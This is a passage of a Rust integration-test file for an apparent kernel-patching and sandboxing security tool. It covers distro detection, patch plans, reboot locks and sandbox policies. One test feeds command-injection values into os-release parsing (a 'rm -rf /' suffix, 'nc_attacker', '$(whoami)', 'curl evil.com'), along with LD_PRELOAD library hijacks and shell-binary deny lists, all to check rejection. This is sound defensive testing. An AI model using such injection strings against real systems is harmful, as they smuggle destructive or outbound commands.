//! Adversarial Proof & Multi-OS Integration Tests for Requirement R6:
//! Universal Multi-OS Kernel Patching & Zero-Reboot Virtual-Patching Shield + 5 Foolproof Invariants.

use agent_octopus::arm::kernel_sentinel_arm::KernelSentinelArm;
use agent_octopus::cli::{parse_octopus_cli, CliParseResult, SandboxMode};
use agent_octopus::containment_ring::{
    CedarGate, ExecutionTier, TieredExecutionDispatcher, TieredToolRequest,
};
use agent_octopus::core::types::ArmRole;
use agent_octopus::research_ingest::{
    hotload_cve_forbid_policies_into_runtime, synthesize_cve_forbid_policies,
};
use agent_octopus::security::bsd_sandbox::build_bsd_confinement_posture;
use agent_octopus::security::cedar_arm::{CedarAuthorizationGateway, CedarPolicyEngine};
use agent_octopus::security::host_network_isolation::{
    apply_virtual_patch_perimeter_shield, build_virtual_patch_perimeter_spec,
    generate_bsd_darwin_pf_virtual_patch_rules, generate_linux_nftables_virtual_patch_rules,
    HostKillSwitchManager,
};
use agent_octopus::security::kernel_patcher::cpe::{
    bsd_cpe23, canonicalize_bsd_version, linux_distro_cpe23, split_unescaped_colons,
};
use agent_octopus::security::kernel_patcher::discovery::bsd::{
    parse_bsd_reboot_pending, parse_freebsd_kernel_info, parse_netbsd_kernel_info,
    parse_openbsd_kernel_info,
};
use agent_octopus::security::kernel_patcher::discovery::linux::{
    classify_linux_distro, parse_linux_reboot_pending, parse_os_release_content,
    parse_os_release_strict, parse_sysfs_livepatch_entries,
};
use agent_octopus::security::kernel_patcher::discovery::macos::parse_macos_posture;
use agent_octopus::security::kernel_patcher::discovery::windows::{
    parse_windows_posture, WindowsRawPostureInput,
};
use agent_octopus::security::kernel_patcher::validation::{
    apply_scrubbed_env, validate_cpe23, validate_cve_id, validate_kernel_release,
    validate_os_release_token, validate_package_name, verify_pinned_binary_path,
};
use agent_octopus::security::kernel_patcher::{
    parse_patch_kernel_args, plan_native_kernel_patch_with_probe,
    plan_native_kernel_patch_with_probe_opts, KernelPatcher, KernelShieldCoordinator,
    KernelVulnerability, LinuxDistro, LivepatchEngine, LivepatchStatus, MockBinaryProbe, OsFamily,
    PatcherError, RebootPendingStatus, ScanOptions, VirtualPatchSurface,
};
use agent_octopus::security::linux_sandbox::{
    build_hardened_sandbox_bpf, build_virtual_patch_socket_family_bpf, evaluate_bpf_filter,
    evaluate_bpf_filter_with_args, AARCH64_VIRTUAL_PATCH_CVE_SYSCALLS, AUDIT_ARCH_AARCH64,
    AUDIT_ARCH_X86_64, EXOTIC_BLOCKED_SOCKET_FAMILIES, LINUX_EAFNOSUPPORT, LINUX_EPERM,
    SECCOMP_RET_ALLOW, SECCOMP_RET_ERRNO, X86_64_VIRTUAL_PATCH_CVE_SYSCALLS,
};
use agent_octopus::security::macos_sandbox::{
    generate_macos_seatbelt_profile, SandboxedMacosConfig,
};
use agent_octopus::security::rl_defense::AdaptiveRlDefenseEngine;
use agent_octopus::security::virtual_patch_shield::{
    build_shield_receipt, KernelAttackSurface, KernelShieldPosture, VirtualPatchShieldStore,
};
use agent_octopus::security::wasm_tier1::{
    WasmSandboxLimits, WasmTier1Executor, WASM_LEDGER_VALIDATOR_WAT,
};
use agent_octopus::security::windows_sandbox::{
    compute_windows_mitigation_policy_mask,
    PROCESS_CREATION_MITIGATION_POLICY_EXTENSION_POINT_DISABLE_ALWAYS_ON,
    PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_NO_LOW_LABEL_ALWAYS_ON,
    PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_NO_REMOTE_ALWAYS_ON,
    PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_PREFER_SYSTEM32_ALWAYS_ON,
    PROCESS_CREATION_MITIGATION_POLICY_WIN32K_SYSTEM_CALL_DISABLE_ALWAYS_ON,
};
use agent_octopus::web::api::{handle_kernel_patcher_status, KernelScanSummary, WebState};
use std::path::PathBuf;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpListener;

#[test]
fn test_r6_all_17_linux_distros_3_bsds_windows_macos_cpe_and_pinned_patch_plans() {
    let linux_cases: Vec<(&str, &str, LinuxDistro, &str, &[&str], &str)> = vec![
        (
            "ID=ubuntu\nVERSION_ID=\"24.04\"",
            "x86_64",
            LinuxDistro::Ubuntu,
            "cpe:2.3:o:canonical:ubuntu_linux:24.04:*:*:*:*:*:*:*",
            &["/usr/bin/canonical-livepatch", "/usr/bin/apt-get"],
            "/usr/bin/canonical-livepatch",
        ),
        (
            "ID=debian\nVERSION_ID=\"12\"",
            "x86_64",
            LinuxDistro::Debian,
            "cpe:2.3:o:debian:debian_linux:12:*:*:*:*:*:*:*",
            &["/usr/bin/apt-get"],
            "/usr/bin/apt-get",
        ),
        (
            "ID=kali\nVERSION_ID=\"2024.3\"",
            "aarch64",
            LinuxDistro::Kali,
            "cpe:2.3:o:kali:kali_linux:2024.3:*:*:*:*:*:*:*",
            &["/usr/bin/apt-get"],
            "/usr/bin/apt-get",
        ),
        (
            "ID=rhel\nVERSION_ID=\"9.4\"",
            "x86_64",
            LinuxDistro::Rhel,
            "cpe:2.3:o:redhat:enterprise_linux:9.4:*:*:*:*:*:*:*",
            &["/usr/sbin/kpatch", "/usr/bin/dnf"],
            "/usr/sbin/kpatch",
        ),
        (
            "ID=fedora\nVERSION_ID=\"40\"",
            "x86_64",
            LinuxDistro::Fedora,
            "cpe:2.3:o:fedoraproject:fedora:40:*:*:*:*:*:*:*",
            &["/usr/bin/dnf"],
            "/usr/bin/dnf",
        ),
        (
            "ID=rocky\nVERSION_ID=\"9.4\"",
            "x86_64",
            LinuxDistro::Rocky,
            "cpe:2.3:o:rockylinux:rocky_linux:9.4:*:*:*:*:*:*:*",
            &["/usr/bin/dnf"],
            "/usr/bin/dnf",
        ),
        (
            "ID=almalinux\nVERSION_ID=\"9.4\"",
            "x86_64",
            LinuxDistro::Alma,
            "cpe:2.3:o:almalinux:almalinux:9.4:*:*:*:*:*:*:*",
            &["/usr/bin/dnf"],
            "/usr/bin/dnf",
        ),
        (
            "ID=centos\nVERSION_ID=\"9\"",
            "x86_64",
            LinuxDistro::CentOS,
            "cpe:2.3:o:centos:centos:9:*:*:*:*:*:*:*",
            &["/usr/bin/dnf"],
            "/usr/bin/dnf",
        ),
        (
            "ID=amzn\nVERSION_ID=\"2023\"",
            "x86_64",
            LinuxDistro::AmazonLinux,
            "cpe:2.3:o:amazon:amazon_linux:2023:*:*:*:*:*:*:*",
            &["/usr/bin/dnf"],
            "/usr/bin/dnf",
        ),
        (
            "ID=ol\nVERSION_ID=\"9.3\"",
            "x86_64",
            LinuxDistro::OracleLinux,
            "cpe:2.3:o:oracle:linux:9.3:*:*:*:*:*:*:*",
            &["/usr/bin/uptrack-upgrade", "/usr/bin/dnf"],
            "/usr/bin/uptrack-upgrade",
        ),
        (
            "ID=sles\nVERSION_ID=\"15.5\"",
            "x86_64",
            LinuxDistro::Sles,
            "cpe:2.3:o:suse:linux_enterprise_server:15.5:*:*:*:*:*:*:*",
            &["/usr/sbin/klp", "/usr/bin/zypper"],
            "/usr/sbin/klp",
        ),
        (
            "ID=opensuse-leap\nVERSION_ID=\"15.6\"",
            "x86_64",
            LinuxDistro::OpenSuse,
            "cpe:2.3:o:opensuse:opensuse:15.6:*:*:*:*:*:*:*",
            &["/usr/bin/zypper"],
            "/usr/bin/zypper",
        ),
        (
            "ID=arch\nVERSION_ID=\"rolling\"",
            "x86_64",
            LinuxDistro::Arch,
            "cpe:2.3:o:archlinux:arch_linux:rolling:*:*:*:*:*:*:*",
            &["/usr/bin/pacman"],
            "/usr/bin/pacman",
        ),
        (
            "ID=alpine\nVERSION_ID=\"3.20\"",
            "x86_64",
            LinuxDistro::Alpine,
            "cpe:2.3:o:alpinelinux:alpine_linux:3.20:*:*:*:*:*:*:*",
            &["/sbin/apk"],
            "/sbin/apk",
        ),
        (
            "ID=nixos\nVERSION_ID=\"24.05\"",
            "x86_64",
            LinuxDistro::NixOS,
            "cpe:2.3:o:nixos:nixos:24.05:*:*:*:*:*:*:*",
            &["/run/current-system/sw/bin/nixos-rebuild"],
            "/run/current-system/sw/bin/nixos-rebuild",
        ),
        (
            "ID=gentoo\nVERSION_ID=\"2.15\"",
            "x86_64",
            LinuxDistro::Gentoo,
            "cpe:2.3:o:gentoo:linux:2.15:*:*:*:*:*:*:*",
            &["/usr/bin/emerge"],
            "/usr/bin/emerge",
        ),
        (
            "ID=flatcar\nVERSION_ID=\"3975.2.0\"",
            "x86_64",
            LinuxDistro::Flatcar,
            "cpe:2.3:o:kinvolk:flatcar_container_linux:3975.2.0:*:*:*:*:*:*:*",
            &["/usr/bin/update_engine_client"],
            "/usr/bin/update_engine_client",
        ),
    ];

    for (os_rel_str, arch, expected_distro, expected_cpe, present_bins, expected_primary) in
        linux_cases
    {
        let os_rel = parse_os_release_strict(os_rel_str).expect("valid os-release");
        let distro = classify_linux_distro(&os_rel);
        assert_eq!(distro, expected_distro);
        let cpe = linux_distro_cpe23(&distro, &os_rel.version_id).expect("distro CPE");
        assert_eq!(cpe, expected_cpe);
        assert_eq!(split_unescaped_colons(&cpe).len(), 13);

        let probe = MockBinaryProbe::with_paths(present_bins, arch);
        let plan = plan_native_kernel_patch_with_probe(&OsFamily::Linux, Some(&distro), &probe)
            .expect("Linux patch plan");
        assert_eq!(plan.primary_command, expected_primary);
        assert!(!plan.steps.is_empty());
        for step in &plan.steps {
            assert!(step.command.starts_with('/'));
            assert!(
                !step.command.ends_with("/sh")
                    && !step.command.ends_with("/bash")
                    && !step.command.contains("cmd.exe"),
                "Never invoke shell in patch step: {}",
                step.command
            );
        }
    }

    // Windows 10/11/Server plan
    let win_probe = MockBinaryProbe::with_paths(&[r"C:\Windows\System32\UsoClient.exe"], "x86_64");
    let win_plan =
        plan_native_kernel_patch_with_probe(&OsFamily::Windows, None, &win_probe).unwrap();
    assert_eq!(
        win_plan.primary_command,
        r"C:\Windows\System32\UsoClient.exe"
    );
    assert_eq!(win_plan.steps.len(), 3);
    assert_eq!(win_plan.steps[0].args, vec!["StartScan"]);
    assert_eq!(win_plan.steps[1].args, vec!["StartDownload"]);
    assert_eq!(win_plan.steps[2].args, vec!["StartInstall"]);

    // macOS plan
    let mac_probe = MockBinaryProbe::with_paths(&["/usr/sbin/softwareupdate"], "aarch64");
    let mac_plan = plan_native_kernel_patch_with_probe(&OsFamily::MacOS, None, &mac_probe).unwrap();
    assert_eq!(mac_plan.primary_command, "/usr/sbin/softwareupdate");
    assert!(mac_plan
        .primary_args
        .contains(&"--agree-to-license".to_string()));

    // FreeBSD / OpenBSD / NetBSD CPE & plans
    assert_eq!(canonicalize_bsd_version("14.1-RELEASE-p5"), "14.1");
    let fbsd = parse_freebsd_kernel_info("14.1-RELEASE-p5", "amd64");
    assert_eq!(fbsd.os_family, OsFamily::FreeBSD);
    assert_eq!(fbsd.cpe23, "cpe:2.3:o:freebsd:freebsd:14.1:*:*:*:*:*:*:*");
    let obsd = parse_openbsd_kernel_info("7.6", "amd64");
    assert_eq!(obsd.os_family, OsFamily::OpenBSD);
    assert_eq!(obsd.cpe23, "cpe:2.3:o:openbsd:openbsd:7.6:*:*:*:*:*:*:*");
    let nbsd = parse_netbsd_kernel_info("10.0", "amd64");
    assert_eq!(nbsd.os_family, OsFamily::NetBSD);
    assert_eq!(nbsd.cpe23, "cpe:2.3:o:netbsd:netbsd:10.0:*:*:*:*:*:*:*");
    assert_eq!(
        bsd_cpe23(&OsFamily::FreeBSD, "14.1-RELEASE-p5").as_deref(),
        Some("cpe:2.3:o:freebsd:freebsd:14.1:*:*:*:*:*:*:*")
    );

    let fbsd_plan = plan_native_kernel_patch_with_probe(
        &OsFamily::FreeBSD,
        None,
        &MockBinaryProbe::with_paths(&["/usr/sbin/freebsd-update"], "amd64"),
    )
    .unwrap();
    assert_eq!(fbsd_plan.primary_command, "/usr/sbin/freebsd-update");

    let obsd_dry = plan_native_kernel_patch_with_probe_opts(
        &OsFamily::OpenBSD,
        None,
        &MockBinaryProbe::with_paths(&["/usr/sbin/syspatch"], "amd64"),
        true,
    )
    .unwrap();
    assert_eq!(obsd_dry.primary_command, "/usr/sbin/syspatch");
    assert_eq!(obsd_dry.primary_args, vec!["-c"]);

    let nbsd_plan = plan_native_kernel_patch_with_probe(
        &OsFamily::NetBSD,
        None,
        &MockBinaryProbe::with_paths(&["/usr/sbin/sysupgrade"], "amd64"),
    )
    .unwrap();
    assert_eq!(nbsd_plan.primary_command, "/usr/sbin/sysupgrade");
}

#[test]
fn test_r6_invariant_1_reboot_pending_latch_and_livepatch_across_oses() {
    // 1. Linux patched on disk, still running old kernel in RAM -> locked
    let no_lp = LivepatchStatus::default();
    let pending = parse_linux_reboot_pending(
        "6.8.0-49-generic",
        true,
        &["linux-image-6.8.0-50-generic"],
        &["6.8.0-49-generic", "6.8.0-50-generic"],
        &no_lp,
    );
    assert!(pending.reboot_required);
    assert!(!pending.livepatch_mitigated);
    assert!(pending.shield_locked_until_reboot);

    // 2. Linux sysfs livepatch active in RAM mitigates pending reboot lock
    let active_lp = parse_sysfs_livepatch_entries(&[("lkp_Ubuntu_6_8_0_49", "1\n")]);
    assert!(active_lp.active_in_ram);
    assert_eq!(active_lp.engine, LivepatchEngine::CanonicalLivepatch);
    let lp_mitigated = parse_linux_reboot_pending(
        "6.8.0-49-generic",
        true,
        &["linux-image-6.8.0-50-generic"],
        &["6.8.0-49-generic", "6.8.0-50-generic"],
        &active_lp,
    );
    assert!(lp_mitigated.reboot_required);
    assert!(lp_mitigated.livepatch_mitigated);
    assert!(!lp_mitigated.shield_locked_until_reboot);

    // 3. Windows RebootPending registry state -> locked
    let (win_posture, win_reboot, win_lp) = parse_windows_posture(
        "10.0.22631.3880",
        &WindowsRawPostureInput {
            hvci_enabled: Some(1),
            vbs_enabled: Some(1),
            vulnerable_driver_blocklist: Some(1),
            hotpatch_enrolled: None,
            cbs_reboot_pending: true,
            wu_reboot_required: false,
            pending_file_rename_ops: true,
        },
    );
    assert_eq!(win_posture.hvci_enabled, Some(true));
    assert_eq!(win_posture.vulnerable_driver_blocklist_enabled, Some(true));
    assert!(!win_lp.active_in_ram);
    assert!(win_reboot.shield_locked_until_reboot);

    // 4. macOS SIP + RSR + [restart]
    let (mac_posture, mac_reboot) = parse_macos_posture(
        "23.4.0",
        Some("14.4.1 (a)"),
        Some("System Integrity Protection status: enabled."),
        Some("* Label: macOS Sonoma 14.5-23F79\n\tTitle: macOS Sonoma 14.5 [restart]"),
    );
    assert_eq!(mac_posture.sip_enabled, Some(true));
    assert_eq!(mac_posture.rsr_version.as_deref(), Some("14.4.1 (a)"));
    assert!(mac_reboot.shield_locked_until_reboot);

    // 5. BSD staged update -> locked
    let (bsd_posture, bsd_reboot) =
        parse_bsd_reboot_pending("14.1-RELEASE-p5", true, None, Some(1));
    assert_eq!(bsd_posture.kern_securelevel, Some(1));
    assert!(bsd_reboot.shield_locked_until_reboot);

    // 6. Coordinator monotonic lock & unlock only on confirmed reboot
    let coord = KernelShieldCoordinator::new();
    let _ = coord
        .apply_post_patch_status(
            &OsFamily::Linux,
            "cpe:2.3:o:linux:linux_kernel:6.8.0:*:*:*:*:*:*:*",
            &pending,
        )
        .expect("lock applied");
    assert!(coord.state().shield_locked_until_reboot);

    let err = coord
        .attempt_loosen_shield(true, &[VirtualPatchSurface::LinuxSeccompHighCveSyscalls])
        .expect_err("cannot loosen while locked");
    assert!(matches!(err, PatcherError::MonotonicViolation(_)));

    let still_pending_err = coord
        .confirm_rebooted_into_kernel(
            &OsFamily::Linux,
            "cpe:2.3:o:linux:linux_kernel:6.8.0:*:*:*:*:*:*:*",
            &pending,
        )
        .expect_err("must refuse unlock while reboot still pending");
    assert!(matches!(
        still_pending_err,
        PatcherError::MonotonicViolation(_)
    ));

    let clean_post_reboot = RebootPendingStatus {
        reboot_required: false,
        running_kernel: "6.8.0-50-generic".to_string(),
        newest_installed_kernel: Some("6.8.0-50-generic".to_string()),
        reasons: Vec::new(),
        livepatch_mitigated: false,
        shield_locked_until_reboot: false,
    };
    coord
        .confirm_rebooted_into_kernel(
            &OsFamily::Linux,
            "cpe:2.3:o:linux:linux_kernel:6.8.0:*:*:*:*:*:*:*",
            &clean_post_reboot,
        )
        .expect("unlock succeeds after reboot confirmed");
    assert!(!coord.state().shield_locked_until_reboot);
}

#[test]
fn test_r6_invariant_2_injection_path_hijack_and_env_scrub_rejection() {
    // Malicious /etc/os-release payloads
    for malicious in [
        "ID=\"ubuntu;rm -rf /\"",
        "ID=ubuntu|nc_attacker",
        "ID=$(whoami)",
        "ID=`id`",
        "ID=ubuntu\nID_LIKE=\"debian && curl evil.com\"",
    ] {
        assert!(
            matches!(
                parse_os_release_strict(malicious),
                Err(PatcherError::InvalidInput(_))
            ),
            "Must reject malicious os-release: {malicious}"
        );
        let sanitized = parse_os_release_content(malicious);
        assert!(
            !sanitized.id.contains(';')
                && !sanitized.id.contains('|')
                && !sanitized.id.contains('$')
                && !sanitized.id.contains('`'),
            "Sanitized os-release leaked metacharacters: {:?}",
            sanitized
        );
    }

    assert!(validate_os_release_token("ubuntu-24.04", "ID").is_ok());
    assert!(validate_kernel_release("6.8.0-49-generic").is_ok());
    assert!(validate_kernel_release("6.8.0;id").is_err());
    assert!(validate_package_name("sys-kernel/gentoo-kernel").is_ok());
    assert!(validate_package_name("../evil").is_err());
    assert!(validate_cve_id("CVE-2024-1086").is_ok());
    assert!(validate_cve_id("CVE-2024-1086;id").is_err());
    assert!(validate_cpe23("cpe:2.3:o:linux:linux_kernel:6.8.0:*:*:*:*:*:*:*").is_ok());
    assert!(validate_cpe23("cpe:2.3:o:linux:linux_kernel;sh:*:*:*:*:*:*:*").is_err());

    // Relative, /tmp, and shell binary paths must be rejected
    for bad_bin in [
        "UsoClient.exe",
        "apt-get",
        "/tmp/apt-get",
        "/var/tmp/dnf",
        r"C:\Temp\UsoClient.exe",
        "/bin/sh",
        "/usr/bin/bash",
        r"C:\Windows\System32\cmd.exe",
        r"C:\Windows\System32\powershell.exe",
    ] {
        assert!(
            verify_pinned_binary_path(bad_bin).is_err(),
            "Must reject untrusted/shell binary path: {bad_bin}"
        );
    }

    // Env scrubbing must reject untrusted env overrides
    let mut cmd = tokio::process::Command::new("echo");
    assert!(apply_scrubbed_env(
        &mut cmd,
        &OsFamily::Linux,
        &[("LD_PRELOAD", "/tmp/evil.so")]
    )
    .is_err());
    assert!(apply_scrubbed_env(
        &mut cmd,
        &OsFamily::MacOS,
        &[("DYLD_INSERT_LIBRARIES", "/tmp/evil.dylib")]
    )
    .is_err());
    assert!(apply_scrubbed_env(&mut cmd, &OsFamily::Linux, &[("PATH", "/tmp")]).is_err());
    assert!(apply_scrubbed_env(
        &mut cmd,
        &OsFamily::Linux,
        &[("DEBIAN_FRONTEND", "noninteractive")]
    )
    .is_ok());
}

#[tokio::test]
async fn test_r6_invariant_3_nvd_429_5xx_corrupt_offline_fail_closed_and_web_status() {
    async fn spawn_status_server(
        status: u16,
        body: &'static str,
    ) -> (String, tokio::task::JoinHandle<()>) {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();
        let h = tokio::spawn(async move {
            if let Ok((mut s, _)) = listener.accept().await {
                let mut buf = [0u8; 1024];
                let _ = s.read(&mut buf).await;
                let resp = format!(
                    "HTTP/1.1 {status} ERR\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                    body.len(),
                    body
                );
                let _ = s.write_all(resp.as_bytes()).await;
            }
        });
        (format!("http://127.0.0.1:{port}/rest/json/cves/2.0"), h)
    }

    let opts = ScanOptions {
        cpe: Some("cpe:2.3:o:linux:linux_kernel:6.8.0:*:*:*:*:*:*:*".to_string()),
        timeout_secs: 2,
        ..Default::default()
    };

    let (u429, h429) = spawn_status_server(429, "{}").await;
    assert!(matches!(
        KernelPatcher::with_base_url(u429)
            .scan_kernel_vulnerabilities(&opts)
            .await,
        Err(PatcherError::RateLimited)
    ));
    h429.abort();

    let (u500, h500) = spawn_status_server(500, "{}").await;
    assert!(matches!(
        KernelPatcher::with_base_url(u500)
            .scan_kernel_vulnerabilities(&opts)
            .await,
        Err(PatcherError::NvdApiError(_))
    ));
    h500.abort();

    let (ubad, hbad) = spawn_status_server(200, "{not_valid_json").await;
    assert!(matches!(
        KernelPatcher::with_base_url(ubad)
            .scan_kernel_vulnerabilities(&opts)
            .await,
        Err(PatcherError::Serialization(_))
    ));
    hbad.abort();

    // Coordinator records degraded telemetry -> fails closed with active baseline surfaces
    let coord = KernelShieldCoordinator::new();
    let receipt = coord
        .record_degraded_telemetry(
            &OsFamily::Linux,
            "cpe:2.3:o:linux:linux_kernel:6.8.0:*:*:*:*:*:*:*",
            "HTTP 429 rate limited",
            Some(429),
        )
        .expect("record degraded");
    assert!(receipt.telemetry_degraded_fail_closed);
    let st = coord.state();
    assert!(st.active);
    assert!(st.telemetry_degraded_fail_closed);
    assert!(st
        .active_surfaces
        .contains(&VirtualPatchSurface::LinuxSeccompHighCveSyscalls));

    // WebState /api/kernel-patcher/status preserves degraded_fail_closed flag & shield state
    let web_state = WebState::default();
    let host_kernel = agent_octopus::security::kernel_patcher::HostKernelInfo {
        os_family: OsFamily::Linux,
        kernel_release: "6.8.0-49-generic".to_string(),
        os_version: "24.04".to_string(),
        cpe23: "cpe:2.3:o:linux:linux_kernel:6.8.0:*:*:*:*:*:*:*".to_string(),
        architecture: "x86_64".to_string(),
    };
    {
        let mut guard = web_state.latest_kernel_scan.write().await;
        *guard = Some(KernelScanSummary {
            scanned_at: chrono::Utc::now(),
            host_kernel,
            vulnerability_count: 0,
            cisa_kev_count: 0,
            vulnerabilities: Vec::new(),
            telemetry_degraded_fail_closed: true,
            scan_status: "degraded_fail_closed".to_string(),
            scan_notice: Some("NVD offline".to_string()),
            livepatch: None,
            reboot_pending: None,
            shield_locked_until_reboot: true,
            security_posture: None,
            virtual_patch_shield: Some(st.clone()),
            merkle_root: Some(receipt.merkle_root_hex.clone()),
        });
    }
    let status_json: serde_json::Value =
        serde_json::from_str(&handle_kernel_patcher_status(&web_state).await).unwrap();
    assert_eq!(status_json["status"], "degraded_fail_closed");
    assert_eq!(status_json["telemetry_degraded_fail_closed"], true);
    assert_eq!(status_json["shield_locked_until_reboot"], true);
    assert_eq!(status_json["shield_active"], true);
}

#[test]
fn test_r6_part_b_no_breakout_wasm_linux_bpf_windows_mitigation_macos_bsd() {
    // 1. CLI --wasm-promote & --sandbox wasm-strict parsing
    let parsed_wasm = parse_octopus_cli(&[
        "octopus".to_string(),
        "run".to_string(),
        "--policy".to_string(),
        "p.json".to_string(),
        "--sandbox".to_string(),
        "wasm-strict".to_string(),
        "--wasm-promote".to_string(),
        "--".to_string(),
        "python".to_string(),
    ]);
    match parsed_wasm {
        CliParseResult::Run(r) => {
            assert_eq!(r.sandbox, SandboxMode::WasmStrict);
            assert!(r.wasm_promote);
        }
        other => panic!("expected Run, got {other:?}"),
    }

    // 2. TieredExecutionDispatcher posture-aware Tier-1 promotion / Tier-2 rejection
    let mut active_posture = KernelShieldPosture::default_fail_closed();
    active_posture.unpatched_cve_ids = vec!["CVE-2024-1086".to_string()];
    active_posture.finalize();

    let native_req = TieredToolRequest {
        agent_id: "r6_test_agent".to_string(),
        role: ArmRole::UntrustedDocIngest,
        tool_name: "shell_exec".to_string(),
        payload: b"hello".to_vec(),
        scratchpad_root: std::env::temp_dir().join("octo_r6_tier"),
        allow_scratch_write: false,
        custom_wat: None,
        native_command: Some(("python".to_string(), vec![])),
    };
    assert!(TieredExecutionDispatcher::classify_tier_with_posture(
        &native_req,
        &active_posture,
        true
    )
    .is_err());

    let wasm_req = TieredToolRequest {
        custom_wat: Some(WASM_LEDGER_VALIDATOR_WAT.to_string()),
        ..native_req
    };
    assert_eq!(
        TieredExecutionDispatcher::classify_tier_with_posture(&wasm_req, &active_posture, true)
            .unwrap(),
        ExecutionTier::Tier1InProcessWasm
    );

    // WasmExecutionReceipt carries virtual_patch_shield_active
    let exec = WasmTier1Executor::try_new().expect("wasm executor");
    let receipt = exec
        .execute_wat(
            "ledger_validator",
            WASM_LEDGER_VALIDATOR_WAT.as_bytes(),
            br#"{"amount": 100}"#,
            WasmSandboxLimits::default(),
        )
        .expect("wat execute");
    assert!(receipt.virtual_patch_shield_active);

    // 3. Linux x86_64 & aarch64 BPF high-CVE EoP + exotic socket-family clamp
    for (arch, nr_socket, cve_list) in [
        (AUDIT_ARCH_X86_64, 41u32, X86_64_VIRTUAL_PATCH_CVE_SYSCALLS),
        (
            AUDIT_ARCH_AARCH64,
            198u32,
            AARCH64_VIRTUAL_PATCH_CVE_SYSCALLS,
        ),
    ] {
        let full_bpf = build_hardened_sandbox_bpf(arch).expect("full bpf");
        for &cve_sys in cve_list {
            assert_eq!(
                evaluate_bpf_filter(&full_bpf, arch, cve_sys),
                SECCOMP_RET_ERRNO | LINUX_EPERM,
                "full BPF must block CVE syscall {cve_sys}"
            );
        }

        let proxy_bpf = build_virtual_patch_socket_family_bpf(arch, false).expect("proxy bpf");
        for &cve_sys in cve_list {
            assert_eq!(
                evaluate_bpf_filter(&proxy_bpf, arch, cve_sys),
                SECCOMP_RET_ERRNO | LINUX_EPERM,
                "proxy BPF must still block CVE syscall {cve_sys}"
            );
        }
        for &af in EXOTIC_BLOCKED_SOCKET_FAMILIES {
            assert_eq!(
                evaluate_bpf_filter_with_args(
                    &proxy_bpf,
                    arch,
                    nr_socket,
                    &[af as u64, 1, 0, 0, 0, 0]
                ),
                SECCOMP_RET_ERRNO | LINUX_EAFNOSUPPORT,
                "proxy BPF must block exotic socket family AF={af}"
            );
        }
        // Standard AF_INET=2 and AF_UNIX=1 allowed for loopback proxy
        for af_ok in [1u64, 2u64, 10u64] {
            assert_eq!(
                evaluate_bpf_filter_with_args(&proxy_bpf, arch, nr_socket, &[af_ok, 1, 0, 0, 0, 0]),
                SECCOMP_RET_ALLOW,
                "proxy BPF must allow standard AF={af_ok}"
            );
        }
    }

    // 4. Windows mitigation policy mask + BYOVD blocklist fallback
    let mask_base = compute_windows_mitigation_policy_mask(false, true);
    assert_ne!(
        mask_base & PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_NO_REMOTE_ALWAYS_ON,
        0
    );
    assert_ne!(
        mask_base & PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_NO_LOW_LABEL_ALWAYS_ON,
        0
    );
    assert_ne!(
        mask_base & PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_PREFER_SYSTEM32_ALWAYS_ON,
        0
    );
    assert_ne!(
        mask_base & PROCESS_CREATION_MITIGATION_POLICY_EXTENSION_POINT_DISABLE_ALWAYS_ON,
        0
    );
    assert_eq!(
        mask_base & PROCESS_CREATION_MITIGATION_POLICY_WIN32K_SYSTEM_CALL_DISABLE_ALWAYS_ON,
        0
    );
    let mask_win32k = compute_windows_mitigation_policy_mask(true, true);
    assert_ne!(
        mask_win32k & PROCESS_CREATION_MITIGATION_POLICY_WIN32K_SYSTEM_CALL_DISABLE_ALWAYS_ON,
        0
    );

    let sentinel = KernelSentinelArm::default();
    let byovd = sentinel
        .enforce_byovd_virtual_patch_blocklist()
        .expect("BYOVD deterministic enforcement");
    assert!(!byovd.is_empty());

    // 5. macOS Seatbelt kernel surface clamp (and /dev not executable)
    let sbpl = generate_macos_seatbelt_profile(&SandboxedMacosConfig {
        program: PathBuf::from("/usr/bin/true"),
        args: vec![],
        read_only_dirs: vec![],
        read_write_dirs: vec![],
        working_dir: None,
        allow_loopback: false,
        control_ports: vec![],
    });
    assert!(sbpl.contains("(deny system-kext-load)"));
    assert!(sbpl.contains("(deny iokit-open)"));
    assert!(sbpl.contains("(deny system-fsctl)"));
    assert!(sbpl.contains("(deny system-nfssvc)"));
    assert!(sbpl.contains("(deny system-privilege)"));
    assert!(sbpl.contains("(deny system-acct)"));
    assert!(sbpl.contains("(deny system-swap)"));
    assert!(!sbpl.contains("(subpath \"/dev\")"));

    // 6. BSD confinement posture
    let fbsd_c = build_bsd_confinement_posture("freebsd", true, false, 64 * 1024 * 1024, &[], &[]);
    assert!(fbsd_c.capsicum_enabled);
    let obsd_c = build_bsd_confinement_posture("openbsd", true, false, 64 * 1024 * 1024, &[], &[]);
    assert_eq!(
        obsd_c.pledge_promises.as_deref(),
        Some("stdio rpath proc exec")
    );
}

#[test]
fn test_r6_part_b_no_breakin_perimeter_strict_cedar_forbid_merkle_and_zero_d3qn() {
    // 1. <1ms perimeter shield + PF/nftables + Merkle proof verification & tamper detection
    let mut posture = KernelShieldPosture::default_fail_closed();
    posture.unpatched_cve_ids = vec!["CVE-2024-38063".to_string(), "CVE-2024-1086".to_string()];
    posture.cisa_kev_ids = vec!["CVE-2024-1086".to_string()];
    posture.affected_surfaces = vec![
        KernelAttackSurface::SmbV3AndKsmbd,
        KernelAttackSurface::HttpSys,
        KernelAttackSurface::Ipv6Rce,
    ];
    posture.finalize();

    let spec = build_virtual_patch_perimeter_spec(&posture, &[5005, 445, 5000]);
    assert!(spec.blocked_inbound_ports.contains(&445));
    assert!(spec.blocked_inbound_ports.contains(&5985));
    assert_eq!(spec.preserved_loopback_ports, vec![5005]);

    let pf_rules = generate_bsd_darwin_pf_virtual_patch_rules(&spec);
    assert!(pf_rules.iter().any(|r| r.contains("port 445")));
    let nft_rules = generate_linux_nftables_virtual_patch_rules(&spec);
    assert!(nft_rules.iter().any(|r| r.contains("tcp dport 445 drop")));

    let perimeter_receipt = apply_virtual_patch_perimeter_shield(&posture, &[5005]).unwrap();
    if perimeter_receipt.os_enforcement_applied {
        assert!(perimeter_receipt.readback_verified);
    } else {
